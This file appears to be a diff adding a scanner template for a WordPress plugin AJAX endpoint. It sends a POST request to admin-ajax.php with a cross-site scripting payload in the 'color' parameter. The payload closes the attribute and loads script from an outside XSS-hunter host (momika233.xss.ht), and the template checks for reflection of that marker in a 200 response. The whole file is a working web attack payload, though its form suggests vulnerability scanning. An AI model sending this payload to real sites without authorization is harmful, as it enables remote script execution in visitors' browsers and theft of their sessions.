@@ -1,0 +1,26 @@
+id: fuzz_xss_momika_wp
+info:
+  author: momika
+  name: fuzz_xss_momika_wp
+  severity: high
+  tags: fuzz_xss_momika_wp
+
+requests:
+
+    -raw:
+    - |
+      POST {{BaseURL}}/wp-admin/admin-ajax.php HTTP/1.1
+      Content-Type: application/x-www-form-urlencoded
+
+      action=more_post_ajax&author=0&cat=125&color=violet"><script src=https://momika233.xss.ht></script>&exclude=&pageNumber=2&postid=undefined&ppp=3&query=undefined&taxonomy=undefined&type=posts
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "momika233"
+        part: body
+
+      - type: status
+        status:
+          - 200
